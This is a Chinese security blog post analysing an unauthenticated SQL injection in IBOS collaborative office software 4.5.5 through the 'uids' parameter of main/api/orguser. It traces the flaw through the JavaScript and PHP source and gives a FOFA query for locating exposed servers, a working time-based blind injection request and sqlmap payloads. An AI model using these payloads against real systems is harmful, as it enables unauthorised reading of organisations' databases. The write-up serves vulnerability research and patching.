---
title: "IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞"
source: https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html
asset_dir: assets/ibos企业协同管理软件-mainapiorguser-sql注入漏洞
---

# IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/13 08:30
* 853浏览
* [0评论](#comment)
* 1小时阅读

深入探索

VPN服务

技术文章订阅

SQL注入防护


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深圳市博思协创网络科技有限公司开发的IBOS企业协同管理软件是一款基于Yii和bootstrap的开源OA/协同办公平台，连接全平台覆盖的酷办公客户端的企业办公平台，旨在提升企业内部沟通协作效率，实现工作流程的优化和数据管理的便捷。其系统main/api/orguser 接口存在SQL注入漏洞，未授权攻击者可利用此漏洞获取系统数据库数据。

物流软件安全

# 影响版本

4.5.5

# fofa语法

> `app="IBOS企业协同管理软件"`

# 漏洞分析

根据漏洞路径搜索直接找到了相关js(static/js/app/ibos.userData.js#L226)，可知传参 uids

```
getUserInfo: function(ids, callback) {
                var data, deptInfo, posInfo,
                    url = Ibos.app.url('main/api/orguser');

                $.post(url, {
                    uids: ids
                }, function(res) {
                    if (res.isSuccess) {
                        data = res.data;
                        callback && callback.call(null, data);
                    } else {
                        Ui && Ui.tip('无法获取成员信息', 'warning');
                        return false;
                    }
                }, 'json');
            },
```

深入探索

安全研究报告

漏洞扫描服务

JSON处理工具

继续看 Ibos.app.url 的实现，发现其系统路由获取如下 /static/js/src/common.js#L713

SQL注入防护

```
    /**
     * 获取路由
     * @method url
     * @param  {String} route   由三个子参数组成的字符： 模块/控制器/动作
     * @param {Object} [param]  作为url参数的对象，{a: 1, b: 1}将解析为 a=1&b=1的格式
     * @example 
     *          Ibos.app.url('main/default/index');
     *          // ==> localhost/?r=main/default/index
     *          Ibos.app.url('main/default/index', { op: "add" });
     *          // ==> localhost/?r=main/default/index&op=add
     *          
     * @return {String}          Url地址
     */
    app.url = function(route, param) {
        route += "";
        if ((route).split("/").length !== 3) {
            // $.error("app.url: 参数route错误");
        } else {
            param = param ? '&' + $.param(param) : '';
            return this.g("SITE_URL") + "?r=" + route + param;
        }
    };
```

深入探索

安全认证考试

网络安全会议

云安全解决方案

因此根据这个直接定位 /system/modules/main/controllers/ApiController.php 里的 actionOrgUser() 函数

代码安全审计

```
    public function actionOrgUser()
    {
        $uids = Env::getRequest('uids');
        $uidArray = StringUtil::getUidAByUDPX($uids);
        $userArray = User::wrapUserInfo($uidArray, false, false);
        $return = array();
        $index = 0;
        foreach ( $userArray as $user ) {
                $return[$index]['id'] = 'u_' . $user['uid'];
                $return[$index]['text'] = $user['realname'];
                $return[$index]['mobile'] = $user['mobile'];
                // 头像小尺寸
                $return[$index]['avatar_small'] = Org::getDataStatic( $user['uid'], 'avatar', 'small' );
                // 头像中尺寸
                $return[$index]['avatar_middle'] = Org::getDataStatic( $user['uid'], 'avatar', 'middle' );
                // 头像大尺寸
                $return[$index]['avatar_big'] = Org::getDataStatic( $user['uid'], 'avatar', 'big' );
                $return[$index]['spaceurl'] = '?r=user/home/index&uid=' . $user['uid'];
                $return[$index]['department'] = empty( $user['deptname'] ) ? '' : $user['deptname'];
                $return[$index]['position'] = empty( $user['posname'] ) ? '' : $user['posname'];
                $return[$index]['role'] = empty( $user['rolename'] ) ? '' : $user['rolename'];
                $return[$index]['deptid'] = empty( $user['deptid'] ) ? 'c_0' : 'd_' . $user['deptid'];
                $return[$index]['positionid'] = empty( $user['positionid'] ) ? '' : 'p_' . $user['positionid'];
                $return[$index]['roleid'] = empty( $user['roleid'] ) ? '' : 'r_' . $user['roleid'];
                $index++;
        }
        return $this->ajaxReturn(array(
            'isSuccess' => true,
            'data' => $return,
        ));
    }
```

继续跟进 getUidAByUDPX 函数 system/core/utils/StringUtil.php#L645

漏洞修复方案

```
    /**
     * 通过'u_1,d_1,p_1,r_1'或者array('u_1','d_1','p_1','r_1')这样的字符串或者数组获取uid
     * @param array|string $udpX
     * @return array
     */
    public static function getUidAByUDPX($udpX, $findC = false, $returnDisable = false, $returnRelated = true)
    {
        $udpA = is_array($udpX) ? $udpX : explode(',', $udpX);
        if ($findC) {
            $diff = array_intersect($udpA, array('c_0', 'alldept'));
            if (!empty($diff)) {
                return User::model()->fetchUidA($returnDisable);
            }
        }
        $uidA = $uArray = $dArray = $pArray = $rArray = array();
        foreach ($udpA as $row) {
            $pre = substr($row, 0, 1);
            if (strcmp($pre, 'u') == 0) {
                $uArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'd') == 0) {
                $dArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'p') == 0) {
                $pArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'r') == 0) {
                $rArray[] = substr($row, 2);
            }
        }
        if (!empty($uArray)) {
            $uidA = array_merge($uidA, $uArray);
        }
        if (!empty($dArray)) {
            $uidFromD = User::model()->fetchAllUidByDeptids($dArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromD);
        }
        if (!empty($pArray)) {
            $uidFromP = User::model()->fetchAllUidByPositionIds($pArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromP);
        }
        if (!empty($rArray)) {
            $uidFromR = User::model()->fetchAllUidByRoleids($rArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromR);
        }
        return array_unique($uidA);
    }
```

getUidAByUDPX() 通过处理输入的 $udpX（可以是字符串或数组）

最终调用 fetchAllUidByDeptids 以及 generateInCondition 处理 where 语句后，执行SQL，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

```
public static function generateInCondition($columnName, array $valueArr)
    {
        $ids = implode("','", $valueArr);
        $condition = sprintf("%s IN ('%s')", $columnName, $ids);

        return $condition;
    }

public function fetchAllUidByDeptids($deptids, $returnDisabled = true, $related = false)
{
    $deptIdArr = !is_array($deptids) ? explode(',', $deptids) : $deptids;
    $condition = util\StringUtil::generateInCondition('`u`.`deptid`', $deptIdArr);
    $query = Ibos::app()->db->createCommand();
    if (true === $related):
        $query = $query->leftJoin(DepartmentRelated::model()->tableName() . ' dr'
            , " `dr`.`uid` = `u`.`uid` ");
        $condition2 = util\StringUtil::generateInCondition('`dr`.`deptid`', $deptIdArr);
        $condition = array(
            'OR',
            $condition,
            $condition2,
        );
    endif;
    if (false === $returnDisabled):
        $condition = array(
            'AND',
            $condition,
            " `u`.`status` != '" . self::USER_STATUS_ABANDONED . "'",
        );
    endif;
    $uidArray = $query->selectDistinct('u.uid')
        ->from($this->tableName() . ' u')
        ->where($condition)
        ->queryColumn();
    return $uidArray;
}
```

因此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用只需要闭合单引号和左括号即可。

编程

# 漏洞复现

会执行两次，一般延时时间为你的 payload 两倍时间

```
GET /?r=main/api/orguser&uids=u_1')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(3)))a)%20AND%20('222'%3D'222 HTTP/1.1
Host: ibos.mrxn.net
```

sqlmap 结果

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uids=u_1') AND 2138=2138 AND ('ajshx'='ajshx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uids=u_1') AND (SELECT 6501 FROM (SELECT(SLEEP(4)))SrQj) AND ('HSYx'='HSYx
---
```

# 参考

* `https://github.com/fzbTech/IBOS.new`
* `https://gitee.com/ibos/IBOS`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞](https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html)  
文章链接：<https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读

安全工具开发


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALmUlEQVR4Aeyci3IjuQ5Dc/b//3lv0BioqZftZJ3Yt6anwoAEQUoR1bHXM7X/fHx8/Ptd+/cLf76yRtrWmnCPYK2Tnxr5sXDB8Lcw2mDVrriaf9TXQD6119e7nEAbyOeEPx613eaBD7CNmvQe+Ro/oqn6nZ8+wZUO+n2utOGC6QOuDS9MLijuUUuNsA1EwWWvP4FpIODpw4y77YK19UbstFUz+uA+qa156HPgGGZM/Yi1X/xowH3CC8dc4q8guC/MuOozDWQlurjfO4GnDgTmWwB7Lj8mWKNbKQtfUbyscvLFxRTLwP3AKE4GjgGFnY09lASO18RVruYBhU+xpw7kKTv6y5s8ZSC5QRXHc625+NEkBo4bGR4cw4wrTbgdZh0huGe04BhO3OXC/wQ+ZSA/sbG/tefPDORvPc0n/NzTQPQ47+zeenA+7mOPVS2ceqD9hymYrzXpFy7xCqMZEdwX9mut+j3CjWslvlUbTcVpIDV5+b9/Am0gcN4euO2P2wTr620Ac9FCH4cXpg6sSazcPQPXAJM0fYDjzUJiIfTcVPxJgDWf7vEF6xg48vUbcKwJ97HWtYFU8vJfdwL/6LZ817Lt1CcWhgPfkDEGJFsacNyu1AiXwk9SudhnuPxa5cNBv1ZtMGqSg75GuuTk/xe7npCc5JvgdiDgWwAnZs9wckDoDoHuloPjKspNAucSV018sGaMwTycuNOEF4L18u9Z9jXivboxD14TjGNe8XYgSl72+yfQBgKeGhjH26A425NfDVyTfEXoc4/W1R7ya93Ol25l0a9y4cD7hBkf0UBft6oJl/2Aa8IL20AUvLn9Fdu7BvJmY54GcutxAj9iYMzPMtYASbWPQ1aacEGgeyPQmtxwwDVwfhwS+dgXTu2oiTa8MBy4TpwsvPzRkoO+puqgz4Fj4GMayMf156UnsB3IOGmgbXTMtURxRg3Q3X7li/xwxcmO4PMbuAZO/KS